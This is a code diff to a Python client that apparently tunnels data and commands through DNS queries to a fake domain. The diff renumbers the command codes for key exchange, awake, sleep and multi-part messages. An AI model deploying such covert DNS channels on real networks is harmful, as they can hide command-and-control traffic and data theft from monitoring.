@@ -42,10 +42,10 @@ TYPES = {'A': 1, 'AAAA': 28, 'CNAME': 5, 'TXT': 16}
 DOMAIN = b".resh.gimel."
 MAX_CHARS_IN_SUBDOMAIN = 63
 MAX_DOMAIN = 255 - len(DOMAIN) - 9 - 9 - 1  # `-9` for the code in base32 and `-9` for the identify number
-CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 100, 'ok&retransmission': 202,
-                   'ok&more': 208, 'next&more': 209, 'last': 210, 'ok&continue': 222}
-SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 299, 'error&retransmission': 400,
-                   'ok&continue': 222, 'more': 208, 'next': 209, 'last': 210}
+CLIENT_COMMANDS = {'keyExchange1': 101, 'keyExchange3': 103, 'ok&ans': 201, 'awake': 300, 'ok&retransmission': 401,
+                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
+SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'error&retransmission': 400,
+                   'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
 
 os_type: str = platform.system()
 identify: bytes = secrets.token_hex(nbytes=4).encode()  # identify number
@@ -122,8 +122,8 @@ def send_req_recv_res(fake_domain: bytes):
     # If we have more than it - we need to split it into separate requests and send each one of them.
     if len(fake_domain) > MAX_DOMAIN:
 
-        enc_codes = [base64.b32encode(str(CLIENT_COMMANDS['ok&more']).encode()),
-                     base64.b32encode(str(CLIENT_COMMANDS['next&more']).encode()),
+        enc_codes = [base64.b32encode(str(CLIENT_COMMANDS['more']).encode()),
+                     base64.b32encode(str(CLIENT_COMMANDS['next']).encode()),
                      base64.b32encode(str(CLIENT_COMMANDS['last']).encode())]
 
         # send first part of answer:
